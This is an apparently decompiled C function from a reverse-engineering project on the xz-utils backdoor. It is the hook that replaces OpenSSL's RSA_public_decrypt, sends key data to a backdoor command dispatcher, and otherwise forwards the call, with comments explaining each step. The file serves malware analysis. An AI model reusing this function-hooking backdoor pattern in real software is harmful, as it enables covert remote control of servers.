// /home/kali/xzre-ghidra/xzregh/10A240_hook_RSA_public_decrypt.c
// Function: hook_RSA_public_decrypt @ 0x10A240
// Calling convention: __stdcall
// Prototype: int __stdcall hook_RSA_public_decrypt(int flen, uchar * from, uchar * to, RSA * rsa, int padding)


/*
 * AutoDoc: Drop-in replacement for RSA_public_decrypt. The shim validates that the loader captured the original PLT target, seeds a stack do_orig flag, and calls run_backdoor_commands so attacker payloads can consume the ciphertext. If the dispatcher clears the flag the hook returns its BOOL result directly; otherwise it tail-calls the preserved RSA_public_decrypt pointer so OpenSSL decrypts the buffer as normal.
 */

#include "xzre_types.h"

int hook_RSA_public_decrypt(int flen,uchar *from,uchar *to,RSA *rsa,int padding)

{
  pfn_RSA_public_decrypt_t orig_RSA_public_decrypt;
  BOOL backdoor_result;
  int openssl_status;
  pfn_RSA_public_decrypt_t rsa_public_decrypt_stub;
  BOOL unused_call_orig_stub;
  BOOL do_orig_flag;
  
  if (((global_ctx != (global_context_t *)0x0) &&
      (global_ctx->imported_funcs != (imported_funcs_t *)0x0)) &&
     // AutoDoc: Bail unless the loader resolved the genuine RSA_public_decrypt pointer; without it we cannot forward the call.
     (orig_RSA_public_decrypt = global_ctx->imported_funcs->RSA_public_decrypt_orig,
     orig_RSA_public_decrypt != (pfn_RSA_public_decrypt_t)0x0)) {
    if (rsa != (RSA *)0x0) {
      do_orig_flag = TRUE;
      // AutoDoc: Treat the stack BOOL as the do_orig flag run_backdoor_commands mutates; returning FALSE here means the dispatcher already handled the ciphertext.
      backdoor_result = run_backdoor_commands(rsa,global_ctx,&do_orig_flag);
      if (do_orig_flag == FALSE) {
        return backdoor_result;
      }
    }
                    /* Hook tail-call: once the dispatcher forwards to OpenSSL it jumps via orig_RSA_public_decrypt, not through a jumptable. */
    // AutoDoc: When the dispatcher leaves do_orig TRUE we tail-call directly into OpenSSL's implementation.
    openssl_status = (*orig_RSA_public_decrypt)(flen,from,to,rsa,padding);
    return openssl_status;
  }
  return 0;
}

